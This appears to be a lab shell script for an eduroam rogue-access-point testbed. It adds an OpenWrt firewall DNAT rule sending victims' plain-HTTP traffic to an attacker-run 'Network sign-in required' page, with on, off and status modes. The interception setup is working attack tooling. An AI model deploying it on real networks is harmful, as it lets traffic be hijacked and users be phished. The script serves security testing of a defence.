#!/usr/bin/env bash
# Tier 2 - plain-HTTP interception on the attacker path (lab only).
#
# Redirects every port-80 request from edu clients (the attacker eduroam victims)
# to an attacker-controlled page served by a second uhttpd instance on B. HTTPS
# (443) is deliberately NOT touched - transparent HTTPS needs a MITM CA the victim
# trusts (Tier 3 / mitmproxy), which is exactly what GECKO prevents.
#
#   on   add the fw4 DNAT (edu tcp:80 -> 10.98.0.1:8880) + uhttpd attacker page
#   off  remove the DNAT (uhttpd instance is left in place, harmless)
#   status
#
# The redirect lives in fw4's per-zone chain dstnat_edu, so it only affects edu
# traffic - the lan/GeckoTest/openNDS path is never touched.
#
#   lab/eduroam/attacker/http-intercept.sh on|off|status
set -euo pipefail

MB=${MANGO_B:-mango-b}
SSH=(ssh -o BatchMode=yes "$MB")
usage() { echo "usage: $0 on|off|status" >&2; exit 2; }
[ $# -eq 1 ] || usage

PAGE='<!doctype html><html><head><meta charset="utf-8"><title>eduroam-lab</title>
<meta name="viewport" content="width=device-width,initial-scale=1">
<style>body{font:16px -apple-system,system-ui,sans-serif;margin:0;background:#0b1f3a;color:#fff}
.c{max-width:520px;margin:12vh auto;padding:28px}h1{font-size:22px}</style></head><body><div class="c">
<h1>Network sign-in required</h1>
<p>Your session on <b>eduroam-lab</b> needs re-authentication.</p>
<p style="opacity:.6;font-size:13px">[LAB] This plain-HTTP request was intercepted and served by the attacker access point. HTTPS sites are not shown here.</p>
</div></body></html>'

case "$1" in
on)
	"${SSH[@]}" "
		mkdir -p /www-attacker
		cat > /www-attacker/index.html <<'HTML'
$PAGE
HTML
		uci set uhttpd.attacker=uhttpd
		uci set uhttpd.attacker.listen_http='10.98.0.1:8880'
		uci set uhttpd.attacker.home='/www-attacker'
		uci set uhttpd.attacker.index_page='index.html'
		uci set uhttpd.attacker.max_requests='50'
		uci commit uhttpd
		/etc/init.d/uhttpd restart >/dev/null 2>&1
		uci set firewall.atk_http=redirect
		uci set firewall.atk_http.name='attacker-http-intercept'
		uci set firewall.atk_http.src='edu'
		uci set firewall.atk_http.proto='tcp'
		uci set firewall.atk_http.src_dport='80'
		uci set firewall.atk_http.dest_ip='10.98.0.1'
		uci set firewall.atk_http.dest_port='8880'
		uci set firewall.atk_http.target='DNAT'
		uci commit firewall
		/etc/init.d/firewall reload >/dev/null 2>&1
	"
	echo "http-intercept ON: edu port-80 traffic -> attacker page (10.98.0.1:8880). HTTPS untouched."
	;;
off)
	"${SSH[@]}" '
		uci -q delete firewall.atk_http || true
		uci commit firewall
		/etc/init.d/firewall reload >/dev/null 2>&1
	'
	echo "http-intercept OFF: DNAT removed, edu HTTP flows normally again."
	;;
status)
	"${SSH[@]}" '
		echo "fw4 redirect:"; nft list table inet fw4 2>/dev/null | grep "attacker-http-intercept" || echo "  (none)"
		echo "attacker page:"; (wget -qO- http://10.98.0.1:8880/ 2>/dev/null || uclient-fetch -qO- http://10.98.0.1:8880/ 2>/dev/null) | grep -o "<title>.*</title>" || echo "  (uhttpd attacker not serving)"
	'
	;;
*) usage ;;
esac
